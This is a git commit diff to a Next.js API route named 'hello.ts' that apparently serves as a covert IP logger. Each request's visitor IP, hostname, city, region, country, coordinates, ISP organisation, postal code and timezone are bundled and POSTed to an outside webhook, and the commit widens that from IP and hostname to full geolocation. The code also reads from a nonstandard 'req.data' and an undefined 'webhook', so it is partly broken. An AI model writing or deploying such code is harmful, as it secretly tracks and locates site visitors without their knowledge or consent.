d3fb64c64b6cc54a62fa114504cff17c5394024e
Exspiravit <100397833+Exspiravit13@users.noreply.github.com>
2022-05-19 15:35:54 -0700

    Update hello.ts

--- pages/api/hello.ts
+++ pages/api/hello.ts
@@ -3,6 +3,14 @@ import type { NextApiRequest, NextApiResponse } from 'next'
 
 type Data = {
   ip?: string,
+  hostname?: string,
+  city?: string,
+  region?: string,
+  country?: string,
+  loc?: string,
+  org?: string,
+  postal?: string,
+  timezone?: string,
   message?: string,
   name?: string
 }
@@ -20,13 +28,19 @@ export default async function handler(
   const ip: string = req.data.ip
   const hostname: string = req.data.hostname
   const city: string = req.data.city
+  const region: string = req.data.region
+  const country: string = req.data.country
+  const loc: string = req.data.loc
+  const org: string = req.data.org
+  const postal: string = req.data.postal
+  const timezone: string = req.data.timezone
   
   await fetch(webhook, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
-    body: JSON.stringify({ content: ip + hostname })
+    body: JSON.stringify({ content: ip + hostname + city + region + country + loc + org + postal + timezone })
   })
     .catch(error => console.error('IP:', ip))
   return res.status(204).end()
